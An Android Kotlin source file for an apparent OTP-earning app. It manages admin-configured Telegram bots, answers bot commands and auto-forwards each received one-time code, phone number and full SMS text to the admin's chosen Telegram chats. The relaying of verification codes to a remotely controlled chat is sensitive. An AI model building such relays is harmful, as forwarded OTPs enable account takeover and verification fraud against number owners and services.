package com.example.service

import android.content.Context
import android.content.SharedPreferences
import android.os.Handler
import android.os.Looper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.Job
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.UUID
import java.util.concurrent.TimeUnit
import java.util.concurrent.ConcurrentHashMap

data class TelegramBotConfig(
    val id: String = UUID.randomUUID().toString(),
    val name: String = "Main Telegram Bot",
    val botToken: String = "",
    val chatId: String = "",
    val isEnabled: Boolean = true, // Whichever bot admin selects, only that bot runs!
    val autoForwardOtp: Boolean = true,
    val description: String = "Admin OTP & Command Bot",
    val addedAt: Long = System.currentTimeMillis()
)

data class TelegramChatMessage(
    val id: String = UUID.randomUUID().toString(),
    val sender: String, // "bot", "user", "system"
    val senderName: String = "Bot",
    val text: String,
    val timestamp: Long = System.currentTimeMillis(),
    val isOtpCard: Boolean = false,
    val otpCode: String? = null,
    val phoneNumber: String? = null,
    val service: String? = null,
    val isDelivered: Boolean = true
)

data class TelegramBotState(
    val bots: List<TelegramBotConfig> = emptyList(),
    val selectedBotId: String = "",
    val isOverlayExpanded: Boolean = false,
    val chatMessages: List<TelegramChatMessage> = emptyList(),
    val isPollingUpdates: Boolean = false,
    val botLogs: List<String> = listOf("Telegram Bot Service initialized."),
    val lastSentStatus: String = ""
) {
    val activeBots: List<TelegramBotConfig>
        get() = bots.filter { it.isEnabled && it.botToken.isNotBlank() && it.chatId.isNotBlank() }

    val currentSelectedBot: TelegramBotConfig?
        get() = bots.firstOrNull { it.id == selectedBotId } ?: activeBots.firstOrNull() ?: bots.firstOrNull()

    val isConnected: Boolean
        get() = activeBots.isNotEmpty()

    val autoForwardOtp: Boolean
        get() = currentSelectedBot?.autoForwardOtp ?: activeBots.any { it.autoForwardOtp }
}

object TelegramBotManager {
    private const val PREFS_NAME = "telegram_bot_prefs"
    private const val KEY_BOTS_JSON = "tg_bots_list_json"
    private const val KEY_SELECTED_BOT_ID = "tg_selected_bot_id"
    private const val KEY_MESSAGES_JSON = "tg_chat_messages_json"

    private var prefs: SharedPreferences? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val mainHandler = Handler(Looper.getMainLooper())
    private var pollingJob: Job? = null
    private val lastUpdateIdMap = ConcurrentHashMap<String, Long>()
    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    private val _state = MutableStateFlow(TelegramBotState())
    val state: StateFlow<TelegramBotState> = _state.asStateFlow()

    fun init(context: Context) {
        if (prefs == null) {
            prefs = context.applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val bots = loadBots()
            val selectedId = prefs?.getString(KEY_SELECTED_BOT_ID, "") ?: ""
            val messages = loadMessages()

            val defaultBots = if (bots.isEmpty()) {
                listOf(
                    TelegramBotConfig(
                        name = "Primary OTP Bot",
                        botToken = "",
                        chatId = "",
                        isEnabled = true,
                        autoForwardOtp = true,
                        description = "Default Telegram Bot for forwarding real-time OTPs"
                    )
                )
            } else bots

            val initialMessages = if (messages.isEmpty()) {
                listOf(
                    TelegramChatMessage(
                        sender = "system",
                        senderName = "Work Shortcut",
                        text = "👋 <b>Welcome to Telegram Bot!</b>\nAdmin panel theke select kora bot ekhane active thakbe. Tumi command pathate paro: <code>/start</code>, <code>/otp</code>, <code>/balance</code>, <code>/numbers</code>, <code>/stats</code> ba normal message!"
                    )
                )
            } else messages

            _state.update {
                it.copy(
                    bots = defaultBots,
                    selectedBotId = if (selectedId.isNotEmpty()) selectedId else (defaultBots.firstOrNull { b -> b.isEnabled }?.id ?: defaultBots.first().id),
                    chatMessages = initialMessages
                )
            }

            if (bots.isEmpty()) {
                saveBots(defaultBots)
            }
        }
        startBotPolling()
    }

    private fun loadBots(): List<TelegramBotConfig> {
        val json = prefs?.getString(KEY_BOTS_JSON, "[]") ?: "[]"
        val list = mutableListOf<TelegramBotConfig>()
        try {
            val arr = JSONArray(json)
            for (i in 0 until arr.length()) {
                val o = arr.getJSONObject(i)
                list.add(
                    TelegramBotConfig(
                        id = o.optString("id", UUID.randomUUID().toString()),
                        name = o.optString("name", "Telegram Bot"),
                        botToken = o.optString("botToken", ""),
                        chatId = o.optString("chatId", ""),
                        isEnabled = o.optBoolean("isEnabled", true),
                        autoForwardOtp = o.optBoolean("autoForwardOtp", true),
                        description = o.optString("description", ""),
                        addedAt = o.optLong("addedAt", System.currentTimeMillis())
                    )
                )
            }
        } catch (_: Exception) {}
        return list
    }

    fun saveBots(bots: List<TelegramBotConfig>) {
        val arr = JSONArray()
        for (b in bots) {
            val o = JSONObject().apply {
                put("id", b.id)
                put("name", b.name)
                put("botToken", b.botToken)
                put("chatId", b.chatId)
                put("isEnabled", b.isEnabled)
                put("autoForwardOtp", b.autoForwardOtp)
                put("description", b.description)
                put("addedAt", b.addedAt)
            }
            arr.put(o)
        }
        prefs?.edit()?.putString(KEY_BOTS_JSON, arr.toString())?.apply()
    }

    private fun loadMessages(): List<TelegramChatMessage> {
        val json = prefs?.getString(KEY_MESSAGES_JSON, "[]") ?: "[]"
        val list = mutableListOf<TelegramChatMessage>()
        try {
            val arr = JSONArray(json)
            for (i in 0 until arr.length()) {
                val o = arr.getJSONObject(i)
                list.add(
                    TelegramChatMessage(
                        id = o.optString("id", UUID.randomUUID().toString()),
                        sender = o.optString("sender", "bot"),
                        senderName = o.optString("senderName", "Bot"),
                        text = o.optString("text", ""),
                        timestamp = o.optLong("timestamp", System.currentTimeMillis()),
                        isOtpCard = o.optBoolean("isOtpCard", false),
                        otpCode = if (o.has("otpCode")) o.optString("otpCode") else null,
                        phoneNumber = if (o.has("phoneNumber")) o.optString("phoneNumber") else null,
                        service = if (o.has("service")) o.optString("service") else null,
                        isDelivered = o.optBoolean("isDelivered", true)
                    )
                )
            }
        } catch (_: Exception) {}
        return list.takeLast(40)
    }

    private fun saveMessages(messages: List<TelegramChatMessage>) {
        val arr = JSONArray()
        for (m in messages.takeLast(40)) {
            val o = JSONObject().apply {
                put("id", m.id)
                put("sender", m.sender)
                put("senderName", m.senderName)
                put("text", m.text)
                put("timestamp", m.timestamp)
                put("isOtpCard", m.isOtpCard)
                m.otpCode?.let { put("otpCode", it) }
                m.phoneNumber?.let { put("phoneNumber", it) }
                m.service?.let { put("service", it) }
                put("isDelivered", m.isDelivered)
            }
            arr.put(o)
        }
        prefs?.edit()?.putString(KEY_MESSAGES_JSON, arr.toString())?.apply()
    }

    /**
     * Admin: Add a new Telegram bot configuration
     */
    fun addBot(name: String, token: String, chatId: String, isEnabled: Boolean = true, autoForward: Boolean = true, description: String = "") {
        val newBot = TelegramBotConfig(
            name = name.trim().ifEmpty { "Bot ${_state.value.bots.size + 1}" },
            botToken = token.trim(),
            chatId = chatId.trim(),
            isEnabled = isEnabled,
            autoForwardOtp = autoForward,
            description = description.trim()
        )
        val updated = _state.value.bots + newBot
        _state.update { it.copy(bots = updated, selectedBotId = if (isEnabled) newBot.id else it.selectedBotId) }
        saveBots(updated)
        addLog("✓ Added new bot: ${newBot.name}")
        syncToCloud()
    }

    /**
     * Admin: Update an existing bot configuration
     */
    fun updateBot(id: String, name: String, token: String, chatId: String, isEnabled: Boolean, autoForward: Boolean, description: String = "") {
        val updated = _state.value.bots.map { b ->
            if (b.id == id) {
                b.copy(
                    name = name.trim(),
                    botToken = token.trim(),
                    chatId = chatId.trim(),
                    isEnabled = isEnabled,
                    autoForwardOtp = autoForward,
                    description = description.trim()
                )
            } else b
        }
        _state.update { it.copy(bots = updated) }
        saveBots(updated)
        addLog("✓ Updated bot settings: $name")
        syncToCloud()
    }

    /**
     * Admin: Toggle / Select which bot runs!
     * Whichever bot is enabled (selected), ONLY that bot will run.
     */
    fun toggleBotEnabled(id: String, enabled: Boolean) {
        val updated = _state.value.bots.map { b ->
            if (b.id == id) b.copy(isEnabled = enabled) else b
        }
        _state.update {
            it.copy(
                bots = updated,
                selectedBotId = if (enabled) id else it.selectedBotId
            )
        }
        saveBots(updated)
        val botName = updated.firstOrNull { it.id == id }?.name ?: "Bot"
        addLog(if (enabled) "✓ Enabled bot: $botName" else "⚪ Disabled bot: $botName")
        syncToCloud()
        startBotPolling()
    }

    /**
     * Admin: Exclusively select only this bot to run.
     * All other bots are disabled so ONLY this chosen bot runs!
     */
    fun selectOnlyThisBot(id: String) {
        val updated = _state.value.bots.map { b ->
            b.copy(isEnabled = (b.id == id))
        }
        _state.update {
            it.copy(
                bots = updated,
                selectedBotId = id
            )
        }
        saveBots(updated)
        prefs?.edit()?.putString(KEY_SELECTED_BOT_ID, id)?.apply()
        val botName = updated.firstOrNull { it.id == id }?.name ?: "Bot"
        addLog("✓ [Exclusive] Only running bot: $botName")
        syncToCloud()
        startBotPolling()
    }

    /**
     * Set a bot as the primary selected bot
     */
    fun setSelectedBot(id: String) {
        prefs?.edit()?.putString(KEY_SELECTED_BOT_ID, id)?.apply()
        _state.update { it.copy(selectedBotId = id) }
    }

    /**
     * Admin: Delete a bot
     */
    fun deleteBot(id: String) {
        val updated = _state.value.bots.filterNot { it.id == id }
        _state.update { it.copy(bots = updated) }
        saveBots(updated)
        addLog("🗑 Deleted bot")
        syncToCloud()
    }

    fun addLog(log: String) {
        val time = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date())
        val entry = "[$time] $log"
        _state.update {
            it.copy(botLogs = (listOf(entry) + it.botLogs).take(30))
        }
    }

    fun addChatMessage(msg: TelegramChatMessage) {
        val updated = _state.value.chatMessages + msg
        _state.update { it.copy(chatMessages = updated.takeLast(40)) }
        saveMessages(updated)
    }

    fun clearChat() {
        val initial = listOf(
            TelegramChatMessage(
                sender = "system",
                senderName = "Work Shortcut",
                text = "🧹 Chat cleared. Ready for new commands."
            )
        )
        _state.update { it.copy(chatMessages = initial) }
        saveMessages(initial)
    }

    /**
     * Send message to all active/enabled bots selected in Admin Panel!
     * ONLY the bots selected/enabled by admin will receive this!
     */
    fun sendMessageToActiveBots(
        text: String,
        onResult: ((Boolean, String) -> Unit)? = null
    ) {
        val active = _state.value.activeBots
        if (active.isEmpty()) {
            onResult?.invoke(false, "এডমিন প্যানেলে কোনো টেলিগ্রাম বট চালু (Enabled) করা নেই!")
            return
        }

        scope.launch {
            var anySuccess = false
            var lastErr = ""

            for (bot in active) {
                try {
                    val url = "https://api.telegram.org/bot${bot.botToken}/sendMessage"
                    val json = JSONObject().apply {
                        put("chat_id", bot.chatId)
                        put("text", text)
                        put("parse_mode", "HTML")
                    }
                    val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
                    val req = Request.Builder().url(url).post(body).build()
                    val resp = httpClient.newCall(req).execute()
                    val respStr = resp.body?.string() ?: ""
                    val ok = resp.isSuccessful && respStr.contains("\"ok\":true")
                    if (ok) {
                        anySuccess = true
                        addLog("✓ [${bot.name}] Sent: ${text.take(30)}...")
                    } else {
                        lastErr = respStr
                        addLog("✕ [${bot.name}] API Error: $respStr")
                    }
                } catch (e: Exception) {
                    lastErr = e.message ?: "Network error"
                    addLog("✕ [${bot.name}] Error: ${e.message}")
                }
            }

            launchMain {
                if (anySuccess) {
                    _state.update { it.copy(lastSentStatus = "✓ মেসেজ পাঠানো হয়েছে (${active.size} টি বট)") }
                    onResult?.invoke(true, "✓ টেলিগ্রামে মেসেজ পাঠানো হয়েছে!")
                } else {
                    _state.update { it.copy(lastSentStatus = "✕ ব্যর্থ: $lastErr") }
                    onResult?.invoke(false, "টেলিগ্রাম ত্রুটি: $lastErr")
                }
            }
        }
    }

    /**
     * User sends a message or command inside the Telegram interface
     */
    fun sendUserMessage(inputText: String, context: Context, onComplete: ((Boolean, String) -> Unit)? = null) {
        val text = inputText.trim()
        if (text.isEmpty()) return

        // 1. Append user outgoing message
        addChatMessage(
            TelegramChatMessage(
                sender = "user",
                senderName = "You",
                text = text
            )
        )

        // 2. Check if command or standard message
        if (text.startsWith("/")) {
            val responseText = executeBotCommandInternal(text)
            addChatMessage(
                TelegramChatMessage(
                    sender = "bot",
                    senderName = _state.value.currentSelectedBot?.name ?: "Telegram Bot",
                    text = responseText
                )
            )
            // Forward command echo to real Telegram bot as well
            sendMessageToActiveBots(
                "💬 <b>User Command:</b> <code>$text</code>\n\n$responseText",
                onComplete
            )
        } else {
            // Forward raw message to Telegram
            val tgFormatted = "💬 <b>App Message:</b>\n$text"
            sendMessageToActiveBots(tgFormatted) { success, msg ->
                if (success) {
                    addChatMessage(
                        TelegramChatMessage(
                            sender = "bot",
                            senderName = _state.value.currentSelectedBot?.name ?: "Telegram Bot",
                            text = "✓ <i>Message delivered to Telegram chat.</i>"
                        )
                    )
                } else {
                    addChatMessage(
                        TelegramChatMessage(
                            sender = "system",
                            senderName = "System",
                            text = "✕ <i>Failed to deliver: $msg</i>"
                        )
                    )
                }
                onComplete?.invoke(success, msg)
            }
        }
    }

    /**
     * Executes built-in Telegram Bot Commands with rich HTML responses
     */
    private fun executeBotCommandInternal(cmd: String): String {
        return when (cmd.trim().lowercase()) {
            "/start" -> {
                """
                    🤖 <b>Telegram Bot Active</b>
                    ━━━━━━━━━━━━━━━━━
                    Welcome to Work Shortcut Telegram Bot!
                    
                    Available commands:
                    • <code>/otp</code> - Check latest received OTP
                    • <code>/balance</code> - Check current balance
                    • <code>/numbers</code> - List active phone numbers
                    • <code>/stats</code> - Show today's statistics
                    • <code>/rates</code> - View country OTP rates
                    • <code>/help</code> - Show command manual
                    • <code>/clear</code> - Clear chat screen
                """.trimIndent()
            }
            "/otp" -> {
                val lastRecord = OtpHistoryManager.state.value.recentRecords.firstOrNull()
                if (lastRecord != null) {
                    """
                        ⚡ <b>LATEST RECEIVED OTP</b>
                        ━━━━━━━━━━━━━━━━━
                        📱 <b>Phone:</b> <code>${lastRecord.phoneNumber}</code>
                        🔑 <b>OTP:</b> <code>${lastRecord.otpCode}</code>
                        🏷 <b>Service:</b> ${lastRecord.service}
                        🌐 <b>Platform:</b> ${lastRecord.platform}
                        💰 <b>Rate:</b> ৳${String.format(java.util.Locale.US, "%.2f", lastRecord.rate)}
                    """.trimIndent()
                } else {
                    "ℹ️ কোনো ওটিপি রেকর্ড পাওয়া যায়নি।"
                }
            }
            "/balance" -> {
                val bal = WithdrawalManager.state.value.availableBalanceTk
                val earned = WithdrawalManager.state.value.totalEarnedTk
                val pending = WithdrawalManager.state.value.pendingWithdrawTk
                """
                    💰 <b>ACCOUNT BALANCE & EARNINGS</b>
                    ━━━━━━━━━━━━━━━━━
                    • Available: <b>৳${String.format(java.util.Locale.US, "%.2f", bal)}</b>
                    • Total Earned: ৳${String.format(java.util.Locale.US, "%.2f", earned)}
                    • Pending Withdraw: ৳${String.format(java.util.Locale.US, "%.2f", pending)}
                """.trimIndent()
            }
            "/numbers" -> {
                val active = UnixSmsManager.state.value.activeNumbers
                if (active.isNotEmpty()) {
                    val list = active.joinToString("\n") { 
                        "• <code>${it.number}</code> (${it.country}) [${it.status.uppercase()}]" 
                    }
                    """
                        📱 <b>ACTIVE NUMBERS (${active.size})</b>
                        ━━━━━━━━━━━━━━━━━
                        $list
                    """.trimIndent()
                } else {
                    "ℹ️ বর্তমানে কোনো এক্টিভ নাম্বার নেই।"
                }
            }
            "/stats" -> {
                val today = OtpHistoryManager.state.value.todayOtps
                val total = OtpHistoryManager.state.value.totalOtpsAllTime
                val activeBotsCount = _state.value.activeBots.size
                """
                    📊 <b>TELEGRAM BOT STATS</b>
                    ━━━━━━━━━━━━━━━━━
                    • Today's OTPs: <b>$today</b>
                    • Lifetime OTPs: <b>$total</b>
                    • Running Bots: <b>$activeBotsCount</b>
                    • Status: 🟢 Online & Listening
                """.trimIndent()
            }
            "/rates" -> {
                val base = UnixSmsManager.state.value.otpRatePerSms
                """
                    🏷 <b>OTP PAYOUT RATES</b>
                    ━━━━━━━━━━━━━━━━━
                    • Base OTP Rate: <b>৳${String.format(java.util.Locale.US, "%.2f", base)}</b>
                    • Rates are automatically credited upon OTP receipt!
                """.trimIndent()
            }
            "/help" -> {
                """
                    📖 <b>COMMAND LIST</b>
                    ━━━━━━━━━━━━━━━━━
                    <code>/start</code> - Welcome & guide
                    <code>/otp</code> - Show last received OTP
                    <code>/balance</code> - Check balance & earnings
                    <code>/numbers</code> - Show your active numbers
                    <code>/stats</code> - Show OTP performance
                    <code>/rates</code> - View country OTP rates
                    <code>/clear</code> - Clear conversation
                """.trimIndent()
            }
            "/clear" -> {
                clearChat()
                "✓ Chat screen cleared."
            }
            else -> {
                "❓ <i>Unknown command. Type <code>/help</code> for available commands.</i>"
            }
        }
    }

    /**
     * Public execution of bot command for UI and widgets
     */
    fun executeBotCommand(cmd: String, context: Context? = null): String {
        return executeBotCommandInternal(cmd)
    }

    /**
     * Start Background Long-Polling for all admin-selected active Telegram bots.
     * Receives commands and messages sent to the real Telegram Bot and responds back!
     */
    fun startBotPolling() {
        if (pollingJob?.isActive == true) return
        _state.update { it.copy(isPollingUpdates = true) }

        pollingJob = scope.launch {
            while (isActive) {
                try {
                    val active = _state.value.activeBots
                    for (bot in active) {
                        pollBotUpdates(bot)
                    }
                } catch (_: Exception) {}
                delay(3000L)
            }
        }
    }

    private suspend fun pollBotUpdates(bot: TelegramBotConfig) {
        val lastUpdateId = lastUpdateIdMap[bot.id] ?: 0L
        val offsetParam = if (lastUpdateId > 0) "&offset=$lastUpdateId" else ""
        val url = "https://api.telegram.org/bot${bot.botToken}/getUpdates?timeout=2$offsetParam&limit=10"
        val req = Request.Builder().url(url).get().build()
        val resp = try { httpClient.newCall(req).execute() } catch (_: Exception) { null } ?: return
        val body = resp.body?.string() ?: return
        if (!resp.isSuccessful || !body.contains("\"ok\":true")) return

        val root = JSONObject(body)
        val results = root.optJSONArray("result") ?: return
        var maxId = lastUpdateId
        for (i in 0 until results.length()) {
            val update = results.optJSONObject(i) ?: continue
            val updateId = update.optLong("update_id", 0L)
            if (updateId >= maxId) {
                maxId = updateId + 1
            }
            val msg = update.optJSONObject("message") ?: update.optJSONObject("channel_post") ?: continue
            val text = msg.optString("text", "").trim()
            val chat = msg.optJSONObject("chat")
            val chatId = chat?.optLong("id")?.toString() ?: bot.chatId
            val from = msg.optJSONObject("from")
            val senderName = from?.optString("first_name", "Telegram User") ?: "Telegram User"

            if (text.isNotBlank() && lastUpdateId > 0) {
                // Incoming message from Telegram User
                addChatMessage(
                    TelegramChatMessage(
                        sender = "user",
                        senderName = senderName,
                        text = text
                    )
                )

                val replyText = if (text.startsWith("/")) {
                    executeBotCommandInternal(text)
                } else {
                    "✓ <b>Received:</b> <i>${text.take(80)}</i>\n\nUse commands:\n• <code>/otp</code>\n• <code>/balance</code>\n• <code>/numbers</code>\n• <code>/stats</code>\n• <code>/help</code>"
                }

                sendReplyToChat(bot.botToken, chatId, replyText)
                addChatMessage(
                    TelegramChatMessage(
                        sender = "bot",
                        senderName = bot.name,
                        text = replyText
                    )
                )
            }
        }
        lastUpdateIdMap[bot.id] = maxId
    }

    private fun sendReplyToChat(botToken: String, chatId: String, htmlText: String) {
        scope.launch {
            try {
                val url = "https://api.telegram.org/bot$botToken/sendMessage"
                val json = JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", htmlText)
                    put("parse_mode", "HTML")
                }
                val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
                val req = Request.Builder().url(url).post(body).build()
                httpClient.newCall(req).execute()
            } catch (_: Exception) {}
        }
    }

    /**
     * Forwards OTP to all admin-selected running bots!
     * ONLY the bots enabled by the admin in Admin Panel will run!
     */
    fun forwardOtpIfEnabled(phoneNumber: String, otpCode: String, service: String, fullMessage: String) {
        val active = _state.value.activeBots.filter { it.autoForwardOtp }
        if (active.isEmpty()) return

        // 1. Add visually appealing Telegram OTP Card to chat feed
        val otpCardMsg = TelegramChatMessage(
            sender = "bot",
            senderName = "Telegram OTP Dispatcher",
            text = """
                ⚡ <b>NEW OTP RECEIVED</b>
                ━━━━━━━━━━━━━━━━━
                📱 <b>Phone:</b> <code>$phoneNumber</code>
                🔑 <b>OTP:</b> <code>$otpCode</code>
                🏷 <b>Service:</b> $service
                💬 <b>Message:</b> $fullMessage
            """.trimIndent(),
            isOtpCard = true,
            otpCode = otpCode,
            phoneNumber = phoneNumber,
            service = service
        )
        addChatMessage(otpCardMsg)

        // 2. Forward to real Telegram bots selected by admin
        val tgText = """
            ⚡ <b>NEW OTP RECEIVED</b>
            ━━━━━━━━━━━━━━━━━
            📱 <b>Number:</b> <code>$phoneNumber</code>
            🔑 <b>OTP:</b> <code>$otpCode</code>
            🏷 <b>Service:</b> $service
            💬 <b>Message:</b> $fullMessage
        """.trimIndent()

        sendMessageToActiveBots(tgText)
    }

    /**
     * Test connection for a specific bot configuration
     */
    fun testBot(bot: TelegramBotConfig, onResult: (Boolean, String) -> Unit) {
        if (bot.botToken.isBlank() || bot.chatId.isBlank()) {
            onResult(false, "Bot Token এবং Chat ID সেট করা নেই")
            return
        }

        scope.launch {
            try {
                // 1. Verify token with getMe
                val getMeUrl = "https://api.telegram.org/bot${bot.botToken}/getMe"
                val getMeReq = Request.Builder().url(getMeUrl).get().build()
                val getMeResp = httpClient.newCall(getMeReq).execute()
                val getMeBody = getMeResp.body?.string() ?: ""

                if (!getMeResp.isSuccessful || !getMeBody.contains("\"ok\":true")) {
                    launchMain { onResult(false, "Invalid Token! Telegram বলছে: $getMeBody") }
                    return@launch
                }

                val botUser = JSONObject(getMeBody).optJSONObject("result")?.optString("username", "") ?: ""

                // 2. Send test ping message
                val testUrl = "https://api.telegram.org/bot${bot.botToken}/sendMessage"
                val testJson = JSONObject().apply {
                    put("chat_id", bot.chatId)
                    put("text", "⚡ <b>Work Shortcut Bot Test</b>\nBot: @$botUser\nStatus: Connected & Ready!\nAdmin selection active.")
                    put("parse_mode", "HTML")
                }
                val body = testJson.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
                val testReq = Request.Builder().url(testUrl).post(body).build()
                val testResp = httpClient.newCall(testReq).execute()
                val testRespStr = testResp.body?.string() ?: ""

                if (testResp.isSuccessful && testRespStr.contains("\"ok\":true")) {
                    launchMain { onResult(true, "✓ সফল! Bot: @$botUser কানেক্টেড এবং টেস্ট মেসেজ পাঠানো হয়েছে!") }
                } else {
                    launchMain { onResult(false, "Chat ID তে মেসেজ যায়নি: $testRespStr") }
                }
            } catch (e: Exception) {
                launchMain { onResult(false, "কানেকশন সমস্যা: ${e.message}") }
            }
        }
    }

    /**
     * Applies bots synchronized from Supabase cloud so all devices use admin-selected bots
     */
    fun applyCloudBots(botsJson: String, context: Context? = null) {
        if (botsJson.isBlank() || botsJson == "[]") return
        try {
            val arr = JSONArray(botsJson)
            val cloudBots = mutableListOf<TelegramBotConfig>()
            for (i in 0 until arr.length()) {
                val o = arr.getJSONObject(i)
                cloudBots.add(
                    TelegramBotConfig(
                        id = o.optString("id", UUID.randomUUID().toString()),
                        name = o.optString("name", "Telegram Bot"),
                        botToken = o.optString("botToken", ""),
                        chatId = o.optString("chatId", ""),
                        isEnabled = o.optBoolean("isEnabled", true),
                        autoForwardOtp = o.optBoolean("autoForwardOtp", true),
                        description = o.optString("description", ""),
                        addedAt = o.optLong("addedAt", System.currentTimeMillis())
                    )
                )
            }
            if (cloudBots.isNotEmpty()) {
                _state.update { it.copy(bots = cloudBots) }
                saveBots(cloudBots)
            }
        } catch (_: Exception) {}
    }

    private fun syncToCloud() {
        val arr = JSONArray()
        for (b in _state.value.bots) {
            val o = JSONObject().apply {
                put("id", b.id)
                put("name", b.name)
                put("botToken", b.botToken)
                put("chatId", b.chatId)
                put("isEnabled", b.isEnabled)
                put("autoForwardOtp", b.autoForwardOtp)
                put("description", b.description)
                put("addedAt", b.addedAt)
            }
            arr.put(o)
        }
        GlobalCloudSyncService.pushTelegramBotsToCloud(arr.toString())
    }

    private fun launchMain(block: () -> Unit) {
        mainHandler.post(block)
    }
}
